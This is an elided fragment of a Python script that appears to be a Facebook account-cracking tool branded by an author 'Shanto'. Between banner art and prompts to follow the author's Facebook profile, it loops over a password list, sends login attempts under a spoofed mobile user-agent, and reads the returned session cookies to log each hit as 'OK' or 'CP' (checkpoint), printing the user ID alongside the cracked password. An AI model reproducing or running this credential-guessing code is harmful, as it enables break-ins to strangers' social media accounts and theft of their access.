...
time.sleep(2)
#os.system('clear')
print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m FOLLOW MY FACEBOOK ID..!")
time.sleep(2)
os.system("espeak -a 300 \"FOLLOW,MY,FACEBOOK,ID,\"")
os.system(f'xdg-open https://www.facebook.com/shantotx90?mibextid=JRoKGi')
...
\033[1;37m══════════════════════════════════════════════════
\033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑\033[1;31m  \033[1;32msʜᴀɴᴛᴏ
\033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎N\033[1;31m  \033[1;32m0.8      
\033[1;32m 𝐒𝐓𝐀𝐓𝐔𝐒 \033[1;31m  \033[1;32mFREE
\033[1;37mJani LoG
\033[1;37m══════════════════════════════════════════════════"""
clear()
os.system("https://www.facebook.com/shantotx90?mibextid=JRoKGi")
xxxx = str(len(ugen))
        ...
        for ps in pwx:
           ...
           'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print(f'\r\33[1;97m[\033[1;96m[sʜᴀɴᴛᴏ-OK]\033[1;97m]\033[1;92m '+uid+' | '+ps+ '  ') 
                ...
                ok.append(uid)
                    ...
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[141:156]
                    print(f'\r\33[1;97m[\033[1;91m[sʜᴀɴᴛᴏ-CP]\033[1;97m]\033[1;90m '+uid+' | '+ps+' ')
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[sʜᴀɴᴛᴏ] [%s]  OK: %s CP: %s'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
    except:
        pass
#---------------------[END MENU]---------------------#
